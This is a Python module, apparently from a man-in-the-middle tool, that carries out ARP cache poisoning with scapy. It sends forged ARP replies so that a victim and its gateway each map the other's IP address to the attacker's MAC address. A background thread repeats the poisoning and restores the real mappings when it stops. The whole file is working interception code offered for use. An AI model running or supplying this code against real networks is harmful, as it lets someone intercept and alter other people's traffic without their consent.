"""ARP poisoning / restoration. Runs in a background thread."""
from __future__ import annotations
import logging
import threading
import time
from typing import Optional

log = logging.getLogger("mitm.arp")


def get_mac(ip: str, iface: str, timeout: float = 2.0) -> Optional[str]:
    """Resolve an IP to a MAC using ARP. Returns None on failure."""
    try:
        from scapy.all import ARP, Ether, srp  # type: ignore
    except Exception as e:
        log.error("scapy unavailable: %s", e)
        return None

    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=timeout, verbose=False, iface=iface,
        )
        for _, rcv in ans:
            return rcv.hwsrc.upper()
    except Exception as e:
        log.warning("ARP resolve failed for %s: %s", ip, e)
    return None


def send_poison(victim_ip: str, victim_mac: str,
                gateway_ip: str, gateway_mac: str,
                attacker_mac: str, iface: str) -> None:
    """
    Send one pair of ARP replies:
      victim   <- "gateway is at attacker_mac"
      gateway  <- "victim is at attacker_mac"
    """
    try:
        from scapy.all import ARP, Ether, sendp  # type: ignore
    except Exception as e:
        log.error("scapy unavailable: %s", e)
        return

    try:
        pkt_to_victim = (
            Ether(src=attacker_mac, dst=victim_mac)
            / ARP(op=2, psrc=gateway_ip, hwsrc=attacker_mac,
                  pdst=victim_ip, hwdst=victim_mac)
        )
        pkt_to_gateway = (
            Ether(src=attacker_mac, dst=gateway_mac)
            / ARP(op=2, psrc=victim_ip, hwsrc=attacker_mac,
                  pdst=gateway_ip, hwdst=gateway_mac)
        )
        sendp([pkt_to_victim, pkt_to_gateway], iface=iface, verbose=False)
    except Exception as e:
        log.warning("ARP poison send failed: %s", e)


def send_restore(victim_ip: str, victim_mac: str,
                 gateway_ip: str, gateway_mac: str,
                 iface: str) -> None:
    """Restore the real MAC addresses on both sides."""
    try:
        from scapy.all import ARP, Ether, sendp  # type: ignore
    except Exception:
        return

    try:
        # To victim: "gateway is really gateway_mac"
        pkt_to_victim = (
            Ether(src=gateway_mac, dst=victim_mac)
            / ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac,
                  pdst=victim_ip, hwdst=victim_mac)
        )
        # To gateway: "victim is really victim_mac"
        pkt_to_gateway = (
            Ether(src=victim_mac, dst=gateway_mac)
            / ARP(op=2, psrc=victim_ip, hwsrc=victim_mac,
                  pdst=gateway_ip, hwdst=gateway_mac)
        )
        # Send a few times to be sure
        for _ in range(3):
            sendp([pkt_to_victim, pkt_to_gateway], iface=iface, verbose=False)
            time.sleep(0.2)
        log.info("ARP state restored for victim=%s gateway=%s", victim_ip, gateway_ip)
    except Exception as e:
        log.warning("ARP restore failed: %s", e)


class ArpPoisoner(threading.Thread):
    """Repeats the poison every `interval` seconds until told to stop."""

    def __init__(self, victim_ip: str, victim_mac: str,
                 gateway_ip: str, gateway_mac: str,
                 attacker_mac: str, iface: str, interval: float = 1.5):
        super().__init__(daemon=True)
        self.victim_ip = victim_ip
        self.victim_mac = victim_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.attacker_mac = attacker_mac
        self.iface = iface
        self.interval = interval
        self._stop = threading.Event()

    def stop(self) -> None:
        self._stop.set()

    def run(self) -> None:
        log.info("ARP poisoner started (victim=%s gw=%s iface=%s)",
                 self.victim_ip, self.gateway_ip, self.iface)
        while not self._stop.is_set():
            send_poison(self.victim_ip, self.victim_mac,
                        self.gateway_ip, self.gateway_mac,
                        self.attacker_mac, self.iface)
            self._stop.wait(self.interval)
        # Best-effort restore on exit
        send_restore(self.victim_ip, self.victim_mac,
                     self.gateway_ip, self.gateway_mac, self.iface)
        log.info("ARP poisoner stopped")